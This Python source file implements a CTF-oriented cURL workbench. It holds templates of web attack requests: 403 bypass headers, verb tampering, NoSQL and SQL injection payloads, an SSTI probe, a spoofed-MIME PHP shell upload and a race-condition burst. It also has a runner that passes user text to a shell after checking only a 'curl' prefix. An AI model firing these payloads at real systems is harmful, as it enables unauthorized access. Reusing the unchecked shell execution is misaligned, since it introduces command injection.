from __future__ import annotations
"""Interactive cURL Workbench and CTF Script Templates."""
import asyncio
import shlex
import time
import re
from typing import Dict, Any, Tuple, List


def _ml(parts: List[str]) -> str:
    """Join curl flags into pretty multi-line backslash format."""
    return " \\\n    ".join(parts)


CURL_TEMPLATES: List[Dict[str, str]] = [
    {
        "name": "403 Bypass: IP & Proxy Spoofing Headers",
        "category": "Bypass",
        "desc": "Injects common reverse proxy headers to bypass IP restrictions.",
        "cmd": _ml([
            "curl -i -k",
            '-H "X-Forwarded-For: 127.0.0.1"',
            '-H "X-Forwarded-Host: localhost"',
            '-H "X-Client-IP: 127.0.0.1"',
            '-H "X-Remote-IP: 127.0.0.1"',
            '-H "X-Remote-Addr: 127.0.0.1"',
            '-H "X-Original-URL: /admin"',
            '-H "X-Rewrite-URL: /admin"',
            '"$TARGET/admin"',
        ]),
    },
    {
        "name": "403 Bypass: Path Normalization (--path-as-is)",
        "category": "Bypass",
        "desc": "Prevents curl from resolving dot-segments like /..;/ or /..;admin.",
        "cmd": _ml([
            "curl -i -k",
            "--path-as-is",
            '"$TARGET/..;/admin"',
        ]),
    },
    {
        "name": "403 Bypass: HTTP Verb Tampering",
        "category": "Bypass",
        "desc": "Tests alternate HTTP methods (HEAD, OPTIONS, PUT, TRACE, PATCH) to bypass auth rules.",
        "cmd": _ml([
            "curl -i -k",
            "-X HEAD",
            '"$TARGET/admin"',
        ]),
    },
    {
        "name": "403 Bypass: HTTP/1.0 Protocol Downgrade",
        "category": "Bypass",
        "desc": "Forces HTTP/1.0 without Host requirement to bypass modern WAFs and proxies.",
        "cmd": _ml([
            "curl -i -k -0",
            '"$TARGET/admin"',
        ]),
    },
    {
        "name": "403 Bypass: Custom Dev/Admin Header",
        "category": "Bypass",
        "desc": "Injects custom access headers like X-Dev-Access, X-Admin, X-Internal.",
        "cmd": _ml([
            "curl -i -k",
            '-H "X-Dev-Access: yes"',
            '-H "X-Admin: true"',
            '-H "X-Internal: 1"',
            '"$TARGET/admin"',
        ]),
    },
    {
        "name": "Injection: NoSQL Auth Bypass (JSON POST)",
        "category": "Injection",
        "desc": "Sends MongoDB/Mongoose operator injection ($ne: null) to bypass login forms.",
        "cmd": _ml([
            "curl -i -k",
            "-X POST",
            '"$TARGET/login"',
            '-H "Content-Type: application/json"',
            """-d '{"username": {"$ne": null}, "password": {"$ne": null}}'""",
        ]),
    },
    {
        "name": "Injection: SSTI Template Probe (Jinja2 / Twig)",
        "category": "Injection",
        "desc": "Tests template execution using URL-encoded {{7*7}}.",
        "cmd": _ml([
            "curl -i -k -G",
            '"$TARGET/"',
            '--data-urlencode "name={{7*7}}"',
        ]),
    },
    {
        "name": "Injection: SQLi Union / Error Probe",
        "category": "Injection",
        "desc": "Injects basic single-quote union payload via GET parameter.",
        "cmd": _ml([
            "curl -i -k -G",
            '"$TARGET/items"',
            "--data-urlencode \"id=1' UNION SELECT null,sqlite_version()--\"",
        ]),
    },
    {
        "name": "Upload: Multipart File Upload (MIME Spoofing)",
        "category": "Upload",
        "desc": "Uploads file with custom extension and spoofed image/png Content-Type.",
        "cmd": _ml([
            "curl -i -k",
            "-X POST",
            '"$TARGET/upload"',
            '-F "file=@shell.php.png;type=image/png"',
        ]),
    },
    {
        "name": "Auth: Active Session Cookies Injection",
        "category": "Auth",
        "desc": "Automatically injects captured session cookies into request.",
        "cmd": _ml([
            "curl -i -k",
            '-b "$COOKIES"',
            '"$TARGET/flag"',
        ]),
    },
    {
        "name": "Auth: Bearer JWT Authorization",
        "category": "Auth",
        "desc": "Sends Bearer token authorization header.",
        "cmd": _ml([
            "curl -i -k",
            '-H "Authorization: Bearer <TOKEN>"',
            '"$TARGET/api/me"',
        ]),
    },
    {
        "name": "Session: Dump Cookies & Follow Redirects (-L -c)",
        "category": "Session",
        "desc": "Follows 30x redirects and stores server Set-Cookie responses into cookie jar.",
        "cmd": _ml([
            "curl -i -k -L",
            "-c /tmp/ctf_cookies.txt",
            "-b /tmp/ctf_cookies.txt",
            '"$TARGET/login"',
        ]),
    },
    {
        "name": "Host Header Injection / Virtual Host Fuzz",
        "category": "Bypass",
        "desc": "Overrides Host header to probe for internal virtual hosts or admin domains.",
        "cmd": _ml([
            "curl -i -k",
            '-H "Host: internal.corp.lan"',
            '"$TARGET/"',
        ]),
    },
    {
        "name": "Timing: Latency Measurement & Status Breakdown",
        "category": "Recon",
        "desc": "Measures DNS, connect, TLS, and total response time for time-based blind SQLi/SSTI.",
        "cmd": _ml([
            "curl -i -k",
            "-o /dev/null -s",
            r'-w "Status: %{http_code}\nTotal: %{time_total}s\nConnect: %{time_connect}s\nSize: %{size_download}b\n"',
            '"$TARGET/"',
        ]),
    },
    {
        "name": "Race Condition: Parallel Turbo Burst (--parallel)",
        "category": "Exploit",
        "desc": "Sends concurrent requests simultaneously to trigger race conditions.",
        "cmd": _ml([
            "curl -i -k",
            "--parallel --parallel-immediate",
            "-X POST",
            '"$TARGET/transfer"',
            '-d "amount=10"',
            '"$TARGET/transfer"',
            '-d "amount=10"',
        ]),
    },
]


def format_curl_command(cmd: str) -> str:
    """Format a one-liner curl command into readable multi-line backslash style.

    Input:
        curl -i -k -H "Foo: Bar" -H "X: Y" "https://target/path"

    Output:
        curl -i -k \\
            -H "Foo: Bar" \\
            -H "X: Y" \\
            "https://target/path"
    """
    cmd = cmd.strip()
    # Flatten any existing backslash continuations first
    flat = re.sub(r"\s*\\\n\s*", " ", cmd).strip()
    if not flat.startswith("curl"):
        return cmd

    try:
        tokens = shlex.split(flat)
    except ValueError:
        return cmd

    # Flags that consume one extra argument
    ARG_FLAGS = {
        "-H", "--header",
        "-d", "--data", "--data-raw", "--data-binary", "--data-ascii",
        "--data-urlencode",
        "-b", "--cookie",
        "-c", "--cookie-jar",
        "-F", "--form",
        "-X", "--request",
        "-u", "--user",
        "-A", "--user-agent",
        "-o", "--output",
        "-w", "--write-out",
        "-e", "--referer",
        "--resolve",
        "--connect-to",
        "--max-time",
        "-m",
    }

    parts: List[str] = []
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok in ARG_FLAGS and i + 1 < len(tokens):
            val = tokens[i + 1]
            # Re-quote the value safely
            if '"' in val:
                escaped = val.replace("'", "\\'")
                quoted_val = f"'{escaped}'"
            else:
                quoted_val = f'"{val}"'
            parts.append(f"{tok} {quoted_val}")
            i += 2
        else:
            if tok.startswith("http://") or tok.startswith("https://"):
                parts.append(f'"{tok}"' if '"' not in tok else tok)
            else:
                parts.append(tok)
            i += 1

    if not parts:
        return cmd

    # Group the initial "curl" and standalone short flags (no space inside) on first line
    first_parts = [parts[0]]
    rest_parts = []
    i = 1
    while i < len(parts):
        p = parts[i]
        if p.startswith("-") and " " not in p:
            first_parts.append(p)
        else:
            rest_parts = parts[i:]
            break
        i += 1
    else:
        rest_parts = []

    first_line = " ".join(first_parts)
    if rest_parts:
        return first_line + " \\\n    " + " \\\n    ".join(rest_parts)
    return first_line


def render_curl_template(cmd_template: str, target_url: str, cookies: Dict[str, str] = None) -> str:
    """Replaces template variables ($TARGET, $COOKIES, etc.) with active target state."""
    clean_target = (target_url or "http://target.ctf").rstrip("/")
    cmd = cmd_template.replace("$TARGET", clean_target)

    if cookies:
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items()])
        cmd = cmd.replace("$COOKIES", cookie_str)
    else:
        cmd = cmd.replace("$COOKIES", "session=token")
    return cmd


async def execute_curl_command(curl_cmd: str, timeout: int = 15) -> Tuple[str, str, float, int]:
    """Executes a curl command asynchronously, capturing stdout, stderr, latency, and return code."""
    # Flatten multi-line backslash continuations so the shell gets a clean one-liner
    shell_cmd = re.sub(r"\s*\\\n\s*", " ", curl_cmd).strip()

    if not shell_cmd.startswith("curl"):
        return "", "Error: Command must start with 'curl'", 0.0, -1

    t0 = time.time()
    try:
        proc = await asyncio.create_subprocess_shell(
            shell_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout_bytes, stderr_bytes = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            elapsed_ms = (time.time() - t0) * 1000
            stdout = stdout_bytes.decode("utf-8", errors="replace")
            stderr = stderr_bytes.decode("utf-8", errors="replace")
            return stdout, stderr, elapsed_ms, proc.returncode or 0
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except Exception:
                pass
            return "", f"Execution timed out after {timeout} seconds!", (time.time() - t0) * 1000, -1
    except Exception as e:
        return "", f"Failed to execute curl: {str(e)}", (time.time() - t0) * 1000, -1


def parse_curl_to_repeater(curl_cmd: str) -> Dict[str, Any]:
    """Extracts method, url, headers, and body from a curl command."""
    flat = re.sub(r"\s*\\\n\s*", " ", curl_cmd).strip()
    result = {"method": "GET", "url": "", "headers": {}, "body": ""}

    try:
        parts = shlex.split(flat)
    except Exception:
        parts = flat.split()

    idx = 1
    urls = []
    headers = {}
    method = "GET"
    body = ""

    while idx < len(parts):
        token = parts[idx]
        if token in ["-X", "--request"] and idx + 1 < len(parts):
            method = parts[idx + 1].upper()
            idx += 2
        elif token in ["-H", "--header"] and idx + 1 < len(parts):
            hdr_str = parts[idx + 1]
            if ":" in hdr_str:
                k, v = hdr_str.split(":", 1)
                headers[k.strip()] = v.strip()
            idx += 2
        elif token in ["-d", "--data", "--data-raw", "--data-binary", "--data-ascii"] and idx + 1 < len(parts):
            body = parts[idx + 1]
            if method == "GET":
                method = "POST"
            idx += 2
        elif token in ["-b", "--cookie"] and idx + 1 < len(parts):
            headers["Cookie"] = parts[idx + 1]
            idx += 2
        elif token in ["-A", "--user-agent"] and idx + 1 < len(parts):
            headers["User-Agent"] = parts[idx + 1]
            idx += 2
        elif token.startswith("http://") or token.startswith("https://"):
            urls.append(token)
            idx += 1
        else:
            if not token.startswith("-") and "." in token and not urls:
                urls.append(token)
            idx += 1

    result["method"] = method
    result["url"] = urls[0] if urls else ""
    result["headers"] = headers
    result["body"] = body
    return result


def curl_to_python_script(curl_cmd: str) -> str:
    """Converts a curl command into a standalone Python httpx script."""
    parsed = parse_curl_to_repeater(curl_cmd)
    method = parsed["method"]
    url = parsed["url"] or "http://target.ctf"
    headers = parsed["headers"]
    body = parsed["body"]

    code = [
        "import httpx",
        "",
        f"url = {repr(url)}",
        f"headers = {repr(headers)}",
    ]
    if body:
        code.append(f"data = {repr(body)}")
        code.append(f"response = httpx.{method.lower()}(url, headers=headers, content=data, verify=False)")
    else:
        code.append(f"response = httpx.{method.lower()}(url, headers=headers, verify=False)")

    code.extend([
        "",
        "print(f'Status: {response.status_code}')",
        "print(f'Headers: {response.headers}')",
        "print(response.text)",
    ])
    return "\n".join(code)

